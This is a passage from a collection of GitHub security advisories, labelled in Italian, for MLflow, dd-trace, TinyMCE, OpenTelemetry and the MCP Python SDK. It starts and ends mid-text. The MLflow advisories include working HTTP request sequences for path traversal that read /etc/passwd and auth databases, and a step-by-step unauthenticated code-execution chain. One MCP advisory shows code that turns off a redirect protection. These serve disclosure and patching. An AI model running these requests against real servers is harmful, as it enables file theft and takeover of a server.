The fix adds a new gflag `stream_max_streams_per_request` with a default value of 64. Requests declaring more streams than the limit are rejected before any response stream is created. Applications that legitimately need to accept more than 64 streams in one RPC must raise this flag; otherwise such requests will fail after applying the fix.

titolo: GHSA-m65p-9j7q-6w33: MLflow vulnerable to arbitrary file read on unauthenticated servers via prompt model version source
descrizione:
### Summary
On MLflow tracking servers running without authentication, which is the default for mlflow server, a remote attacker can read arbitrary files from the server’s filesystem by creating a model version tagged as a prompt whose source is a schemeless local path.

The fix for CVE-2026-2614 in 3.10.0 added a prompt-specific branch to the `CreateModelVersion` handler that rejects `file://` URIs and absolute paths but runs path validation only when the source carries a URL scheme. A schemeless value such as `../../etc`, a plain relative name, `.`, a percent-encoded path, or a Windows drive-letter path is therefore stored unchanged as the model version’s artifact location, and the `model-versions/get-artifact endpoint` later serves files from it with the privileges of the server process. The tag check also keyed on the presence of the `mlflow.prompt.is_prompt` tag rather than its value, so a false value still selected the weaker branch.

Servers using `--app-name basic-auth` are also affected: any authenticated user can create a registered model, so a low-privilege account can use this to read the authentication database, including the admin password hash.

Affected: MLflow 3.10.0 through 3.16.1. Fixed in 3.17.0 by [mlflow/mlflow#25870](https://github.com/mlflow/mlflow/pull/25870), which accepts only MLflow’s own placeholder sources for prompt versions and requires the prompt tag to be `true`.

### Details
When creating a model version with the `mlflow.prompt.is_prompt` tag set to true, the request is handled by the prompt branch in `_create_model_version()`.

`mlflow/server/handlers.py:2674-2690`:
```python
is_prompt = _is_prompt_request(request_message)
if is_prompt:
    source = request_message.source
    parsed = urllib.parse.urlparse(source)
    if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):
        raise MlflowException(...)
    if parsed.scheme:
        _validate_non_local_source_contains_relative_paths(source)
else:
    if request_message.model_id:
        _validate_source_model(request_message.source, request_message.model_id)
    else:
        _validate_source_run(request_message.source, request_message.run_id)
```
The prompt branch does not call `_validate_source_run()`, `_validate_source_model()`, or `_validate_non_local_source_contains_relative_paths()` for schemeless relative paths.

The artifact-read sink later trusts the stored source:

`mlflow/server/handlers.py:2765-2782`:
```python
def get_model_version_artifact_handler():
    name = request.args.get("name")
    version = request.args.get("version")
    path = request.args["path"]
    path = validate_path_is_safe(path)
    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)
    ...
    else:
        artifact_repo = get_artifact_repository(artifact_uri)
        artifact_path = path

    return _send_artifact(artifact_repo, artifact_path)
```
`_send_artifact()` calls `artifact_repository.download_artifacts(path)` and serves the resulting local file with `send_file()`.

### PoC
Prerequisite: A reachable MLflow tracking server with model registry endpoints enabled.

1. Create a sentinel file on the server:
```bash
printf 'MLFLOW_PWNED_SENTINEL_REPORT' > /tmp/sentinel-mlflow.txt
```

2. Send the following requests to the MLflow server to exploit the traversal:

First, create a registered model:
```http
POST /api/2.0/mlflow/registered-models/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{"name": "pwned-model"}
```

Next, create a prompt-tagged model version with the malicious relative source `../../../tmp`:
```http
POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{
  "name": "pwned-model",
  "source": "../../../tmp",
  "tags": [{"key": "mlflow.prompt.is_prompt", "value": "true"}]
}
```

Finally, retrieve the arbitrary file via the artifact download endpoint by supplying the target filename in the `path` parameter:
```http
GET /api/2.0/mlflow/model-versions/get-artifact?name=pwned-model&version=1&path=sentinel-mlflow.txt HTTP/1.1
Host: 127.0.0.1:5000
```
This returns the contents of `/tmp/sentinel-mlflow.txt`. The same primitive can read sensitive files like `/etc/passwd` or tracking databases (e.g. `mlflow.db`).

### Impact
Direct impact is arbitrary local file read as the MLflow server process. Confirmed read targets include:
- `/etc/passwd`
- SQLite tracking databases readable by the process (e.g., `mlflow-auth.db` or `basic_auth.db`)
- Environment variables or configurations stored on disk
- `/home/user/.bash_history`

Threat model: An attacker who can reach the MLflow tracking server HTTP port can read arbitrary files readable by the MLflow server process. On unauthenticated MLflow deployments, this is directly exploitable without credentials. On auth-enabled deployments, any authenticated user (even low-privileged or "read-only" accounts, depending on default RBAC configurations allowing model creation) can use the primitive. Leaked credential stores may enable offline password attacks or broader administrative compromise.

titolo: GHSA-j7qq-vr8c-xvw3: MLflow CrewAI autologging records LLM provider API keys in logged trace spans
descrizione:
### Summary

`mlflow.crewai.autolog()` leaks CrewAI LLM provider API keys into MLflow trace telemetry.

When a CrewAI `Agent` is instrumented with MLflow autologging, MLflow serializes the agent's `__dict__` and converts its fields to strings. The `llm` field contains the CrewAI LLM object, whose string representation includes its `api_key` in plaintext.

As a result, an application that calls `mlflow.crewai.autolog()` can unintentionally send its LLM provider API key to the MLflow trace backend or configured OTLP destination.

The application does not need to explicitly log the credential or place it in a span attribute. The credential is extracted automatically by MLflow's instrumentation.

This was verified on **MLflow 3.16.0** with **CrewAI 1.15.18** using MLflow's own OTLP exporter. The fake credential appeared in **5 attribute locations across 2 spans**.

### Details

The primary issue is in:

`mlflow/crewai/autolog.py::_get_agent_attributes()`

The function walks the CrewAI `Agent.__dict__` and converts agent fields to strings. `tools` and `embedder` receive special handling, but credential-bearing objects such as the following are not sanitized:

* `llm`
* `function_calling_llm`
* `agent_executor`
* `crew`

For example, `agent.llm` is a CrewAI `LLM` object. In CrewAI 1.15.18, the underlying LLM model contains `api_key` as a normal field. Its string representation therefore contains the credential:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-...' ...
```

MLflow subsequently stores this string as a span attribute.

There is an important indication that this is an unintended disclosure: MLflow's dedicated LLM attribute extraction already explicitly excludes `api_key` in `_get_llm_attributes()`. The LLM span therefore does not expose the credential, while the broader Agent `__dict__` serialization bypasses that protection.

There is also a second, independent serialization path in:

`mlflow/crewai/autolog.py::_construct_full_inputs()`

This code uses:

```python
v.__dict__ if hasattr(v, "__dict__") else v
```

on call arguments. During CrewAI execution, the `Agent` object is passed as an argument, causing its `__dict__` to be expanded and the credential-bearing LLM object to be included in `mlflow.spanInputs`.

Therefore, there are two independent leakage paths:

1. **Agent span attributes** through `_get_agent_attributes()`
2. **Span inputs** through `_construct_full_inputs()`

Fixing only the Agent attribute serialization would leave the `mlflow.spanInputs` path vulnerable.

A safer approach would be to avoid recursively serializing arbitrary object `__dict__` values. Agent telemetry should use an explicit allowlist of non-sensitive scalar fields, and credential-bearing objects such as `llm`, `function_calling_llm`, `agent_executor`, and `crew` should either be reduced to safe metadata or omitted.

Similarly, `_construct_full_inputs()` should not automatically expand arbitrary objects through `__dict__`, or the resulting values should pass through the same sanitization mechanism before being attached to a span.

### PoC

Environment:

```text
MLflow: 3.16.0
CrewAI: 1.15.18
Python: 3.12.3
opentelemetry-exporter-otlp-proto-http: 1.42.1
```

#### 1. Direct serialization proof

The following demonstrates the vulnerability without starting a Crew, making a network request, or requiring an MLflow server:

```python
import importlib
from crewai import LLM, Agent

autolog = importlib.import_module("mlflow.crewai.autolog")

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="r",
    goal="g",
    backstory="b",
    llm=llm,
)

attrs = autolog._get_agent_attributes(agent)

assert "sk-proj-EXAMPLE1234567890" in attrs["llm"]

print(attrs["llm"])
```

The output contains the API key in plaintext, for example:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-EXAMPLE1234567890' ...
```

No provider request is required.

#### 2. End-to-end trace disclosure

The issue can also be reproduced through MLflow's actual OTLP exporter.

Configure a local OTLP HTTP receiver and set:

```bash
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://127.0.0.1:4318/v1/traces
export OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobuf
export CREWAI_DISABLE_TELEMETRY=true
```

Then run:

```python
import mlflow

from crewai import Agent, Crew, LLM, Task

mlflow.crewai.autolog()

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="Support Responder",
    goal="Answer support questions",
    backstory="A support agent",
    llm=llm,
)

task = Task(
    description="Answer the user's question",
    expected_output="A response",
    agent=agent,
)

crew = Crew(
    agents=[agent],
    tasks=[task],
)

crew.kickoff()
```

A local OTLP receiver can decode the `ExportTraceServiceRequest` sent by MLflow.

The provider request is expected to fail because the credential is intentionally fake. This does not affect the vulnerability: the sensitive value is added to the MLflow span when the instrumentation starts, before the provider call succeeds or fails.

In the tested environment, the fake API key appeared in the exported telemetry in **5 locations across 2 spans**, including:

```text
Support Responder
  attributes.llm
  attributes.function_calling_llm
  attributes.agent_executor
  attributes.mlflow.spanInputs

Task.execute_sync
  attributes.mlflow.spanInputs
```

The captured value is produced by MLflow's actual telemetry/export path rather than being manually inserted into a span.

All credentials used in the reproduction are locally generated fake values. No real API credential is required.

### Impact

**Type:** Sensitive Information Disclosure / Credential Disclosure
**CWE:** CWE-532 — Insertion of Sensitive Information into Log File

Any application using `mlflow.crewai.autolog()` with a CrewAI `LLM` configured with an API key can unintentionally disclose that credential through MLflow traces.

The credential is written to trace telemetry even though the application does not explicitly log it.

Anyone with access to the MLflow trace storage or configured OTLP destination may therefore obtain the provider credential. Depending on the deployment, this can include MLflow users, observability operators, or third-party telemetry providers.

The leaked credential can then potentially be used against the corresponding LLM provider account, including for unauthorized API usage and associated costs.

The issue is particularly significant because the credential crosses a trust boundary: a provider API key intended for use by the application is automatically copied into observability telemetry where a broader set of users or systems may have access.

The vulnerability does not require the developer to intentionally log the secret. The only relevant prerequisite is enabling the CrewAI autologging integration.

### Patches

Fixed in MLflow 3.17.0 by #25845. `mlflow.crewai.autolog()` now reduces CrewAI LLM objects to their model name and drops credential-like keys before they are written to span attributes or `mlflow.spanInputs`.

### Remediation

- Upgrade to `mlflow>=3.17.0`.
- Upgrading stops new leakage but does not remove credentials already written. Rotate any LLM provider key that a CrewAI `LLM` object held (for example one passed as `LLM(api_key=...)`) while `mlflow.crewai.autolog()` was enabled on MLflow 2.19.0 through 3.16.x.
- Delete or redact the affected traces in the MLflow tracking backend and in any OTLP destination they were exported to. The key appears in Agent and Crew span attributes and in `mlflow.spanInputs`.

### Workarounds

If you cannot upgrade yet, disable CrewAI autologging with `mlflow.crewai.autolog(disable=True)`.

titolo: GHSA-26p8-2jq9-3vq9: MLflow vulnerable to remote code execution on unauthenticated servers via third-party scorer deserialization importing caller-placed artifact modules
descrizione:
## Summary MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously. An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints: 1. Create an experiment whose local artifact location points to a writable allowed scorer package. 2. Create a run, causing MLflow to allocate `//artifacts/`. 3. Upload a Python module into that run artifact directory. 4. Submit a serialized third-party scorer whose module path resolves to the uploaded file. 5. Trigger server-side import and class construction through `/ajax-api/3.0/mlflow/scorer/invoke`. On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree. The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match. ## Technical details ### 1. The allow-list accepts attacker-created descendants At release commit `86cd7f5a1dc25a1387ad07c87811bbc30f62951c`, `mlflow/genai/scorers/scorer_utils.py` defines these allowed roots: ```python THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({ "mlflow.genai.scorers.ragas", "mlflow.genai.scorers.deepeval", "mlflow.genai.scorers.trulens", "mlflow.genai.scorers.phoenix", }) ``` In `mlflow/genai/scorers/base.py`, the deserializer accepts either an exact root or any descendant: ```python module_path == m or module_path.startswith(m + ".") ``` It then performs the following operations using request-controlled values: ```python module = importlib.import_module(module_path) scorer_class = getattr(module, class_name, None) scorer_instance = scorer_class(**init_kwargs) ``` A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code. Relevant source locations at the v3.14.0 release commit: * `mlflow/genai/scorers/scorer_utils.py`, allowed third-party scorer modules * `mlflow/genai/scorers/base.py`, third-party scorer deserialization and construction ### 2. Deserialization occurs before trace processing In `mlflow/server/handlers.py`, `_invoke_scorer_handler()` parses the supplied serialized scorer and calls: ```python scorer = Scorer.model_validate_json(serialized_scorer) ``` Only after deserialization and construction does the handler call: ```python batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store) ``` The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs. The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof. No background job execution or special job-execution server option is required to reach the constructor. ### 3. MLflow's artifact layout places the module under the trusted prefix The experiment creation endpoint accepts an `artifact_location`. For file-backed experiments, MLflow derives each run artifact directory as: ```text //artifacts/ ``` The proof of concept selects this package directory in the official v3.14.0 image: ```text file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens ``` After creating a run and uploading `audit_.py`, the resulting filesystem location is: ```text /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens//artifacts/audit_.py ``` The corresponding import path is: ```text mlflow.genai.scorers.trulens..artifacts.audit_ ``` The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller. ### 4. Authentication and authorization behavior With authentication disabled, as in the default reproduced server configuration, no credentials are required. When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to `validate_gateway_proxy`, which returns `True` without performing an experiment- or scorer-level resource permission check. Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment before the import occurs. ## Proof of concept The attached reproduction is intentionally isolated: * exact official MLflow v3.14.0 image pinned by manifest digest; * Docker network disabled; * MLflow bound to container loopback; * no shell command or external callback; * no external request; * no host filesystem write; * marker created beside the uploaded run artifact; * marker retrieved through the run-artifact download endpoint; and * disposable container removed after completion. Run: ```bash ./run-official-image.sh ``` Expected output: ```text MLFLOW_VERSION=3.14.0 PACKAGE_DIR=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens CREATE_EXPERIMENT_STATUS=200 CREATE_RUN_STATUS=200 UPLOAD_STATUS=200 INVOKE_STATUS=500 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The security-relevant result is: ```text PROOF_MATCH=1 RESULT=AFFECTED ``` This proves that the attacker-controlled constructor executed in the MLflow server process before the later scorer-processing failure. ## Reproduction environment * **Release:** MLflow v3.14.0 * **Release commit:** `86cd7f5a1dc25a1387ad07c87811bbc30f62951c` * **Official image:** `ghcr.io/mlflow/mlflow:v3.14.0` * **Manifest digest:** `sha256:967de3ca34b6a5751718e380a0a383eb0ce1a6f5b484f363bd0da7559117a5f8` * **Python version:** 3.10.18 * **Image-configured user:** empty * **Observed runtime user:** uid 0 * **Server bind:** `127.0.0.1:5000` * **Container network:** disabled * **Backend store:** `sqlite:////work/mlflow.db` * **Default artifact root:** `/work/artifacts` * **Authentication:** disabled * **Special job-execution option:** none Server command inside the disposable container: ```bash mlflow server \ --host 127.0.0.1 \ --port 5000 \ --backend-store-uri sqlite:////work/mlflow.db \ --default-artifact-root /work/artifacts ``` ## Affected range and source lineage The vulnerable third-party scorer deserialization behavior was introduced by commit: ```text 02eea26035b9d8e65af31e6e8f058ca195f62cdd Enable third-party scorer registration in OSS MLflow (#22634) ``` The feature is absent from v3.11.1 and first appears in v3.12.0. Runtime reproduction succeeds on v3.14.0. The relevant `mlflow/genai/scorers/base.py` content is unchanged at master commit: ```text 20858c9426a9644dfcf9545a92cbb534376779eb ``` No fixed release was identified as of 2026-07-12. ## Impact On the reproduced stock no-auth image, any network caller who can reach the tracking server can execute Python code as the MLflow process without credentials or user interaction. Successful exploitation provides confidentiality, integrity, and availability impact over all data, credentials, network access, and filesystem locations available to the MLflow server process. The stock image's runtime uid 0 increases container-level impact. Host impact still depends on the container runtime configuration, mounted paths, granted capabilities, socket exposure, and other isolation controls. In authentication-enabled deployments, exploitation requires an authenticated principal capable of creating an experiment and run and uploading artifacts. The exact chain also requires the server process to be able to write beneath one of the allowed scorer packages. This condition holds in the reproduced official image and may hold in virtual environments installed and run by the same operating-system user. A read-only container filesystem or a scorer package directory owned by a different, non-writable user blocks this exact placement chain. ## Artifacts and attachments ### Remote proof-of-concept script POC Script: [new_remote_poc.py](https://github.com/user-attachments/files/29936616/new_remote_poc.py) The remote proof of concept was then executed as follows. The disposable machine’s public IP has been redacted: ```bash python3 new_remote_poc.py \ --target http:// \ --package-dir /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens \ --acknowledge-owned-target I_OWN_THIS_TARGET ``` The complete sanitized output was: ```text TARGET=http:// VERSION_STATUS=200 MLFLOW_VERSION=3.14.0 CREATE_EXPERIMENT_STATUS=200 EXPERIMENT_ID=2 CREATE_RUN_STATUS=200 RUN_ID=9a2d665eb38940b68983f0586f623115 UPLOAD_STATUS=200 IMPORT_PATH=mlflow.genai.scorers.trulens.9a2d665eb38940b68983f0586f623115.artifacts.audit_1783843760683972103 INVOKE_STATUS=500 INVOKE_RESPONSE_PREVIEW='\n\n500 Internal Server Error\n

Internal Server Error

\n

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

\n' PROOF_DOWNLOAD_STATUS=200 EXPECTED_MARKER_SHA256=7a423b479df3524567fdf8cc3e7f6c4bfccc577fbcc4bac9519db8bd1cc61ed5 PROOF_MATCH=1 SERVER_CLEANUP_PATH=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115 PROOF_OUTPUT_BEGIN { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": "Linux-7.0.0-1006-aws-x86_64-with-glibc2.31", "python_implementation": "CPython", "python_version": "3.10.18", "server_datetime_utc": "2026-07-12T08:09:43.555055+00:00", "whoami": "root", "whoami_returncode": 0, "whoami_stderr": "" } PROOF_OUTPUT_END RESULT=AFFECTED EXPERIMENT_METADATA_CLEANUP_STATUS=200 CLEANUP_NOTE=discard the temporary test instance or remove SERVER_CLEANUP_PATH on the owned host ``` The proof file was also verified directly inside the disposable container: ```bash cat /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115/artifacts/execution-proof-1783843760683972103.json ``` The file contained: ```json { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": "Linux-7.0.0-1006-aws-x86_64-with-glibc2.31", "python_implementation": "CPython", "python_version": "3.10.18", "server_datetime_utc": "2026-07-12T08:09:43.555055+00:00", "whoami": "root", "whoami_returncode": 0, "whoami_stderr": "" } ``` The results demonstrate that: * the attacker-controlled module was uploaded beneath an allowed scorer package; * MLflow imported the request-selected module and invoked its constructor; * the constructor executed as the MLflow server process, which ran as `root` in the reproduced official image; * the constructor created a server-side proof file containing a random marker and bounded runtime information; * the proof file was retrieved successfully through MLflow’s artifact-download endpoint; and * the later HTTP 500 occurred only after constructor execution. The authoritative reproduction indicators are: ```text UPLOAD_STATUS=200 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The disposable cloud machine and container were removed after testing. titolo: GHSA-x94g-w73q-hpcw: dd-trace: ReDOS in URL query string obfuscation
descrizione:
### Summary

A regular expression used to obfuscate URL query strings can consume excessive CPU when processing certain attacker-controlled input. This can stall request processing and cause denial of service in applications using affected HTTP tracing integrations.

### Details

The default query-string obfuscation pattern can exhibit excessive backtracking. The pattern is applied synchronously when recording HTTP URL metadata, allowing query-string processing to occupy application resources for an extended period.

As a workaround, set DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP to the fixed regex below, then restart the application.

```
DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP='(?:(?:"|%22)?)(?:(?:old[-_]?|new[-_]?)?p(?:ass)?w(?:or)?d(?:1|2)?|pass(?:[-_]?phrase)?|secret|(?:api[-_]?|private[-_]?|public[-_]?|access[-_]?|secret[-_]?|app(?:lication)?[-_]?)key(?:[-_]?id)?|token|consumer[-_]?(?:id|key|secret)|sign(?:ed|ature)?|auth(?:entication|orization)?)(?:(?:\s|%20)*(?:=|%3D)[^&]+|(?:"|%22)(?:\s|%20)*(?::|%3A)(?:\s|%20)*(?:"|%22)(?:%2[^2]|%[^2]|[^"%])+(?:"|%22))|(?:bearer(?:\s|%20)+[a-z0-9._\-]+|token(?::|%3A)[a-z0-9]{13}|gh[opsu]_[0-9a-zA-Z]{36}|(?:(?<![\w-])|(?<=%[0-9a-f]{2}))ey[I-L][\w-]+(?:=|%3D)*\.ey[I-L][\w-]+(?:=|%3D)*(?:\.(?:[\w.+/=-]|%3D|%2F|%2B)+)?|-{5}BEGIN(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY-{5}[^\-]+-{5}END(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY(?:-{5})?(?:\n|%0A)?|(?:ssh-(?:rsa|dss)|ecdsa-[a-z0-9]+-[a-z0-9]+)(?:\s|%20|%09)+(?:[a-z0-9/.+]|%2F|%5C|%2B){100,}(?:=|%3D)*(?:(?:\s|%20|%09)+[a-z0-9._-]+)?)'
```

### Proof of concept

Detailed triggering inputs and reproduction steps are omitted from this advisory. The patched version includes regression coverage for the affected behavior.

### Impact

Regular expression denial of service (ReDoS) affecting applications that process attacker-controlled URL query strings through the vulnerable obfuscation pattern. Successful exploitation can cause excessive CPU consumption, prolonged request latency, and service unavailability.

The vulnerable processing is enabled by default for affected HTTP integrations that include query strings in URL span tags.

titolo: GHSA-mf2p-h6hf-fcwm: TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization
descrizione:
### Impact
Stored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.

### Patches
This vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.

### Workarounds
No official workaround available.

### Fix
To avoid this vulnerability:

Upgrade to TinyMCE 8.9.3 or higher.
Upgrade to TinyMCE 7.9.4 or higher.

### Acknowledgements
Tiny thanks [Fariskhi Vidyan](https://github.com/farisv) and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.

titolo: GHSA-w4fh-qvv9-3v23: Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server
descrizione:
### Summary
In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.

### Am I affected?
Yes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.

Affected versions:

- `mcp` 1.10.0 through 1.29.1
- `mcp` 2.0.0 through 2.1.1

### Fix
Upgrade to:

- 1.x: `mcp` 1.30.0 or later
- 2.x: `mcp` 2.2.0 or later

**Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:

1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server.
2. Return the token's audience from `verify_token()` as `AccessToken.resource`.

A token for another service then gets `401`. With only the first change, every request gets `401`.

If your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.

If you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.

titolo: GHSA-f5m9-jfrj-jjj7: OpenTelemetry Python: Unbounded memory allocation in Jaeger baggage propagation
descrizione:
## Summary

`JaegerPropagator.extract()` in `opentelemetry-propagator-jaeger` did not enforce limits when extracting inbound `uberctx-*` baggage headers. Attacker-controlled baggage could cause unnecessary CPU work and short-lived heap allocations while processing more data than the propagator should accept.

## Impact

Services that enable the optional Jaeger propagator and accept untrusted inbound propagation headers may experience increased per-request resource usage. This can contribute to denial-of-service risk when transport-level limits are absent or configured above the baggage limits.

The practical impact for most Python web deployments is limited. The package must be installed separately, and the Jaeger propagator is not enabled by the default OpenTelemetry Python configuration.

Common Python web servers also constrain request headers before they reach the propagator:

- Gunicorn allows a maximum of 100 request-header fields and 8,190 bytes per field by default.
- Uvicorn’s h11 implementation limits its incomplete-event buffer to 16,384 bytes by default.

The risk is higher for non-HTTP transports, custom `TextMapGetter` implementations, or deployments where server and gateway limits have been increased or disabled.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

## Patches

Versions of `opentelemetry-propagator-jaeger` earlier than `1.45.0` are affected.

Upgrade `opentelemetry-propagator-jaeger` to version `1.45.0` or later.

Version `1.45.0` limits extraction to 180 entries and 8,192 total bytes and skips entries larger than 4,096 bytes.

## Credit

tonghuaroot

titolo: GHSA-5h93-6whr-6q8j: Model Context Protocol Python SDK: HTTP client transports followed cross-origin redirects carrying custom headers and bodies
descrizione:
### Summary
In affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:

- custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and
- on a `307` or `308` redirect the request body was re-sent there too.

The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.

A lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.

Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.

### Am I affected?
Yes, if your code uses the SDK as an MCP client over HTTP through any of:

- `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL)
- `streamablehttp_client` or `sse_client`
- `ClientSessionGroup` with HTTP server parameters
- the internal `create_mcp_http_client` helper

This includes an HTTP client you passed in yourself with `follow_redirects=True`.

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

- MCP servers
- stdio clients
- a client you supplied with `follow_redirects` left at its default of `False`

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.

The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.

If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.

Until you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.

<details>
<summary>If you genuinely need the old behaviour (unsupported)</summary>

This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:

```python
import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead

class FollowRedirectsAnyway(httpx2.AsyncClient):
    """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""

    async def send(self, request, *, follow_redirects=False, **kwargs):
        return await super().send(request, follow_redirects=True, **kwargs)

http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))
# streamable_http_client(url, http_client=http_client)

# sse_client / streamablehttp_client take a factory instead:
def client_factory(headers=None, timeout=None, auth=None):
    return FollowRedirectsAnyway(headers=headers, auth=auth,
                                 timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300))
# sse_client(url, httpx_client_factory=client_factory)
```

The redirect handling is then the HTTP library's own, as before the fix: a lone `Authorization` header is still dropped on cross-origin hops and `301`/`302`/`303` become `GET`. It is not something the SDK supports or tests.

</details>

titolo: GHSA-rwrf-2pqf-9j8j: Model Context Protocol Python SDK: Client fetched server-chosen $ref URLs while validating tool results against output schemas
descrizione:
### Summary
In affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:

